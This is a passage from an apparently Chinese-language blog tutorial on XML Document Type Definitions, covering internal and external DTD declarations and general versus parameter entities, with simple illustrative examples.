可被成行地声明于 <strong>XML 文档中</strong>，也可作为一个<strong>外部引用</strong>。</p><h2 id="一个DTD在XML内部声明的实例"><a href="#一个DTD在XML内部声明的实例" class="headerlink" title="一个DTD在XML内部声明的实例"></a>一个DTD在XML内部声明的实例</h2><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!--XML声明,定义 XML 的版本 (1.0)--&gt;&lt;!DOCTYPE note [&lt;!--定义此文档是note类型的文档--&gt;  &lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note有4个元素：“to、from、heading、body”--&gt;  &lt;!ELEMENT to      (#PCDATA)&gt;  &lt;!--定义 to 元素为 &quot;#PCDATA&quot; 类型--&gt;  &lt;!ELEMENT from    (#PCDATA)&gt;&lt;!--定义 from 元素为 &quot;#PCDATA&quot; 类型--&gt;  &lt;!ELEMENT heading (#PCDATA)&gt;&lt;!--定义 heading 元素为 &quot;#PCDATA&quot; 类型--&gt;  &lt;!ELEMENT body    (#PCDATA)&gt;&lt;!--定义 body 元素为 &quot;#PCDATA&quot; 类型--&gt;]&gt;&lt;note&gt;  &lt;to&gt;George&lt;&#x2F;to&gt;  &lt;from&gt;John&lt;&#x2F;from&gt;  &lt;heading&gt;Reminder&lt;&#x2F;heading&gt;  &lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;&lt;&#x2F;note&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="一个DTD在XML外部声明的实例"><a href="#一个DTD在XML外部声明的实例" class="headerlink" title="一个DTD在XML外部声明的实例"></a>一个DTD在XML外部声明的实例</h2><p>​    若 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p><p><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></p><p>包含DTD的“note.dtd”文件:</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拥有外部DTD文档实例：</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;&lt;!--包含DTD的“note.dtd”文件,封装在DOCTYPE定义中--&gt;&lt;note&gt;&lt;to&gt;George&lt;&#x2F;to&gt;&lt;from&gt;John&lt;&#x2F;from&gt;&lt;heading&gt;Reminder&lt;&#x2F;heading&gt;&lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;&lt;&#x2F;note&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><ul><li>参数实体只能在DTD中使用</li><li>参数实体可嵌套定义，但内层定义的参数实体<code>%</code>需要<strong>HTML转义</strong>。</li></ul><table><thead><tr><th></th><th>一般实体声明：</th><th>引用：</th><th>参数实体声明：</th><th>引用：</th></tr></thead><tbody><tr><td>内部实体</td><td><code>&lt;!ENTITY 实体名 实体的值 &gt;</code></td><td>&amp;实体名</td><td><code>&lt;!ENTITY %实体名 &quot;实体的值&quot;&gt; </code></td><td>%实体名；</td></tr><tr><td>外部实体</td><td><code>&lt;!ENTITY 实体名 SYSTEM  url &gt;</code></td><td>&amp;实体名</td><td><code>&lt;!ENTITY %实体名 SYSTEM url&gt; </code></td><td>%实体名；</td></tr></tbody></table><p><strong>实例：</strong></p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY normal    &quot;hello&quot;&gt;     &lt;!-- 内部一般实体 --&gt;    &lt;!ENTITY % normal2 &quot;hello&quot;&gt;     &lt;!-- 内部参数实体 --&gt;    &lt;!ENTITY normal3 SYSTEM &quot;http:&#x2F;&#x2F;xml.org&#x2F;hhh.dtd&quot;&gt;    &lt;!-- 外部一般实体 --&gt;    &lt;!ENTITY % normal4 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;1234.dtd&quot;&gt;        &lt;!-- 外部参数实体 --&gt;    %normal4;            &lt;!-- 引用参数实体 --&gt;]&gt;&lt;message&gt;&amp;normal;&lt;&#x2F;message&gt;    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="为什么使用DTD"><a href="#为什么使用DTD" class="headerlink" title="为什么使用DTD"></a>为什么使用DTD</h2><ul><li>通过 DTD，每一个 XML 文件均可携带一个有关其<strong>自身格式</strong>的描述。</li><li>独立的团体可一致地使用某个标准的 DTD 来<strong>交换数据。</strong></li><li>应用程序也可使用某个标准的 DTD 来<strong>验证从外部接收到的数据</strong>。</li><li>还可以使用 DTD 来<strong>验证您自身的数据</strong>。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> web安全基础 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
